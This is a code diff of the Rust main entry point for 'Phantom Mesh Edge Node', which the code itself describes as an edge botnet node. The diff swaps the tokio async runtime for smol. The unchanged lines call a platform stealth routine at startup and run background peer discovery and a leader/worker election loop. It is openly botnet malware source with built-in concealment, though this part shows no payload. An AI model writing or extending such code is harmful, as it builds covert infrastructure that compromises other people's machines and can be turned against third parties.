@@ -1,6 +1,7 @@
 //! # Phantom Mesh Edge Node
 //!
 //! Main entry point for the Edge botnet node.
+//! Using smol for lightweight async runtime.
 
 mod core;
 mod network;
@@ -15,20 +16,24 @@ use log::{info, error};
 use core::{run_leader_mode, run_worker_mode};
 use discovery::{ElectionService, NodeRole, ZeroNoiseDiscovery};
 
-#[tokio::main]
-async fn main() {
+fn main() {
     env_logger::init();
     info!("edge started");
 
     // Apply platform-specific stealth
     stealth::check_and_apply_stealth();
 
+    // Run async main loop with smol
+    smol::block_on(async_main());
+}
+
+async fn async_main() {
     // Discovery Daemon runs in background always
     let disc = Arc::new(ZeroNoiseDiscovery::new());
     let dc = disc.clone();
-    tokio::spawn(async move {
+    smol::spawn(async move {
         dc.run_daemon().await;
-    });
+    }).detach();
 
     loop {
         info!("[Main] Entering Election Phase...");
@@ -51,8 +56,9 @@ async fn main() {
             }
             _ => {
                 error!("Unexpected Role Unbound");
-                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+                smol::Timer::after(std::time::Duration::from_secs(5)).await;
             }
         }
     }
 }
+
